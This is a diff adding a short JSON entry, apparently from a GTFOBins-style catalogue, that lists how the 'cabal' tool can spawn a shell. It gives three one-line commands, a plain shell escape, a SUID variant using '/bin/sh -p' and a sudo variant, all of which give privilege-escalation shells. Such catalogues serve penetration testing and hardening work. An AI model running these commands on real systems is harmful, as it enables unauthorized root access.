@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "cabal exec -- /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./cabal exec -- /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo cabal exec -- /bin/sh\n"
+      }
+    ]
+  }
+}
